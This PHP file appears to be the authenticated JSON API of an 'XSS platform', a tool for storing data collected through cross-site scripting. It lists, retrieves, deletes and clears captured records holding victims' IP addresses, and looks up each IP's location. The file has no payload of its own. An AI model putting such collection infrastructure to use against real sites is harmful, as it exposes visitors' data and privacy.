<?php
define("IN_XSS_PLATFORM",true);
require('auth.php');
require_once("functions.php");
require_once("config.php");
require_once("dio.php");
header('Content-Type: application/json');
if(isset($_GET['cmd']))
{
	switch($_GET['cmd'])
	{
		//所有记录包括详细信息
		case 'list':
			echo json_encode(dirList());
			break;
		
		//只列出时间戳（索引id）
		case 'simplelist':
			echo json_encode(dirSimpleList());
			break;
		
		//根据时间戳（索引id）获得单条信息
		case 'get':
			if(isset($_GET['id'])&&preg_match('/^[0-9]{10}$/',$_GET['id']))
				echo json_encode(loadInfo($_GET['id']));	
			else
				echo json_encode(false);
			break;
			
		//根据时间戳（索引id）删除单条信息
		case 'del':
			if(isset($_GET['id'])&&preg_match('/^[0-9]{10}$/',$_GET['id']))
				echo json_encode(delInfo($_GET['id']));	
			else
				echo json_encode(false);
			break;
		
		//清空记录
		case 'clear':
			echo json_encode(clearInfo());	
			break;	
			
		default:
			echo json_encode(false);
	}
}
else
	echo json_encode(false);

function dirSimpleList() { 
	$files = glob(DATA_PATH . '/*.php'); 
	foreach ($files as &$file){
		$file=basename($file,".php");
	}
	return $files;
}

function dirList() { 
	$list=array();
	$files = glob(DATA_PATH . '/*.php'); 
	arsort($files);
	foreach ($files as $file) { 
		$filename=basename($file,".php");
		$info=loadInfo($filename);
		$isChange=false;
			
		//如果没有设置location，就查询qqwry.dat判断location
		if(!isset($info['location']))
		{
			$info['location']=convertip($info['user_IP'],IPDATA_PATH);
			$isChange=true;
		}
		
		if($isChange)
			saveInfo(json_encode($info),$filename);
		$list[]= $info;
	} 		
	return $list; 
}
?>